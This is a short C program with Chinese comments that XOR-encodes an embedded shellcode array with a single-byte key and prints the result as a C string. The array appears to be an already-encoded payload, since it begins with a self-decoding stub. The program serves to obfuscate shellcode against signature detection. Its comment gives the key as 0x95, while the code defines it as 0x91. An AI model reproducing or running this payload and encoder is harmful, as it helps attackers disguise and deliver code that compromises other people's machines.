#include <string.h>
#include <stdio.h>
//以0x95进行异或
#define KEY 0x91

//待编码的shellcode
unsigned char ShellCode[]=
"\x2b\xc9\xb1\xbb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x45"
"\x14\xa0\xe9\x83\xeb\xfc\xe2\xf4\x6c\xdd\x11\x5c\x9c\xfa\x79"
"\x9d\x61\xe0\xfb\x68\x36\x07\x9b\x39\x7c\x9b\x23\x02\xb9\xf6"
"\x54\xf9\x5c\x9c\x80\x0b\x7b\xf4\x5b\xf6\x61\x76\xae\xa1\x86"
"\xab\x14\x10\x17\xae\xc4\x2e\x77\xd9\x98\x20\xe6\x06\x70\x07"
"\x8e\xdb\x8d\x1d\x0c\x2e\xda\xfa\x01\x06\xc6\x7f\xd4\x44\x55"
"\x0b\xa3\xca\xc9\x37\x62\x20\xee\x5f\xb5\xdd\xf4\xdd\x40\x8a"
"\x13\x5c\xb4\xb6\x1f\x05\x2a\x05\xe2\x72\xa2\xfb\x4d\x99\x1b"
"\x64\xb0\x66\xe4\x73\x8e\xc7\x2b\xc0\x41\x9e\xf9\x76\xf7\xfe"
"\x1a\x88\x4a\x77\xe3\x7b\xb9\x6c\xd1\xde\x72\xdb\x1a\x9b\xbc"
"\x71\xb0\xc9\x5b\x8b\x09\x7a\xae\x74\xf6\x65\x98\xd5\x39\xee"
"\x6f\xac\xcb\x40\xc1\xe8\x28\xb6\x74\x45\xd1\x4d\x8f\x5e\xe3"
"\xf0\x5c\xc9\x08\x8d\xaa\x63\xa2\xab\x45\x99\x1b\x6c\xb8\x66"
"\xe4\x0b\xf6\xa7\x4b\x98\x19\xde\xb9\x3e\xbe\xc4\x1a\x33\x89"
"\x02\x99\x05\x6a\x97\xc4\xe3\x4b\x5e\xa5\x12\xd5\x60\xf4\xa1"
"\x11\x80\x0f\xef\x7e\x03\x26\xf8\x4f\x77\x69\xe2\x66\xad\x0c"
"\x1d\x74\xac\xa4\x31\x61\xf9\xc8\x6a\xaa\x06\x62\x5e\x28\xe2"
"\xee\xb4\xa5\x83\xcb\xfd\xfd\x13\x53\x30\xaf\x8b\x44\xed\xa3"
"\xa8\xd6\x52\x86\xb5\x2b\x6a\xb3\xd4\x53\x5f\xe3\x4a\x68\xbf"
"\xac\x96\xad\xde\x32\x0a\x3c\x9b\xfa\x97\x22\x5d\xb0\xde\x9a"
"\x46\xe6\x40\x79\x1b\x0d\xb0\x15\x0d\x17\x3c\xe9\xdb\x82\xbb"
"\xc8\x2f\x34\x7d\xf9\x2e\x1b\xdf\xb1\x39\x4c\x04\x34\xa1\xc1"
"\x4c\x98\xc3\x44\xc2\x37\xee\x0f\x2f\xdd\x55\x98\x0c\xf6\x7d"
"\xd3\x1f\x34\x4a\xba\x93\x4f\x24\x38\xd5\x67\x75\xc5\x58\xed"
"\xc0\xe9\x9d\xe2\x3b\xd5\x63\xc5\x85\xa3\x09\xa9\x36\x1f\xaa"
"\xdd\xb6\x9e\x5f\xd2\xd3\xa8\xd0\xeb\xb3\xcd\xc9\x07\x62\x6b"
"\x81\x92\xfd\xb4\x3c\x03\x08\xde\x80\x30\x1c\x37\x7e\x5e\xcb"
"\xdd\x0a\x34\xb1\x1d\xc3\xed\xc8\x88\xcc\xe5\x9a\x24\x71\x89"
"\x67\x3a\x04\xfa\xee\x94\xaf\xde\x13\xdc\x61\x55\x1f\x28\x52"
"\x39\x3d\x74\x45\xcb\xe1\xdd\x33\x10\xf7\xf5\x14\x16\xdf\xa6"
"\x59\xf7\x04\x99\x32\x9b\x52\xb3\x9f\x91\xb4\x54\xe0\x9a\xc1"
"\x18\x85\xf0\xe2\xda\x21\xe6\x15\x6a\x3f\x27\x3e\x6c\x64\xf1"
"\x6a\x3d\xa7\x2a\x0d\xec\xfe\x36\xba\xd8\xd9\x37\x53\x3e\xe6"
"\x8f\xf1\xf7\xc5\x35\x8d\x6e\xea\xf0\xb4\x4a\x45\xed\x4c\xcf"
"\xb9\xa7\x74\xa1\x05\xa9\x36\x54\x1d\x42\x8c\x36\x67\xb6\xba"
"\x5e\x85\xfd\x6e\x9a\x3a\x23\xb6\x38\x3b\x96\x76\x1d\xa5\x23"
"\xda\x2a\x74\x93\xfe\xc4\x84\xa1\x64\xe6\x47\xdc\x6a\x31\x91"
"\x4f\x8c\x71\x8f\x67\x8d\xc7\x33\xd1\xba\x14\xca\x30\x0b\xeb"
"\x8f\x13\x91\xb2\x47\x37\x0a\x01\x0e\xad\xba\x70\x40\x03\x6e"
"\xa6\xce\x63\x0d\xc2\x9d\x2a\x3a\x2d\x25\xca\x18\x9a\x17\x75"
"\x63\xdd\x97\xaa\x4e\x7b\x09\xcd\x78\x78\x3f\x8d\x97\x01\x80"
"\x86\x1b\xe5\x3a\xcd\xd4\xd5\xee\x93\x2e\x9b\xf5\xeb\xd8\x1b"
"\xa7\x1b\x3e\x2b\x57\x6b\x32\x12\x74\x17\xa6\x48\x97\xf0\x18"
"\xc8\x26\x91\xc3\x3c\x4e\xf2\xec\x06\x76\xdf\xdc\xb8\xb2\x9c"
"\x60\x0a\x82\xdd\x78\x5c\x53\x06\xe8\xa1\x5c\x6f\xb9\x67\x98"
"\x43\x0e\xe5\x4b\xe6\x3e\x86\xf1\x80\x03\xef\xa6\xd9\xc2\xef"
"\x27\x18\x30\xfa\x43\xf4\x12\x89\xb1\x70\x39\x68\xcf\xde\xb4"
"\xd1\xd6\x70\x66\xa3\x91\x1e\x92\x44\x03\x8c\xef\xb9\x4a\x1a"
"\x13\x26\xc2\x7c\x51\x5a\xdb\x98\x87\x3e\xbf\xb8\x52\xae\x3f"
"\xca\xb2\xf8\x21\xbc\xf0\xbe\xd6\x13\x44\x15\xb6\x8d\x79\xe4"
"\xf2\x8d\xe6\x70\x96\xfd\x52\xd6\xbb\x12\x65\x2e\x96\x0e\x5c"
"\x4f\x99\xc1\xaf\x2f\xe9\x90";
int main()
{
    int i, nLen;
    unsigned char enShellCode[1500];
    nLen = sizeof(ShellCode) - 1;

    printf("\"");

    for(i=0; i<nLen; i++)
    {
        enShellCode[i] = ShellCode[i] ^ KEY;
        printf("\\x%.2x", enShellCode[i]);
        if(i%16==0 && i>0)
        printf("\"\n\"");
    }
    printf("\";\n\n");

    return 0;
}
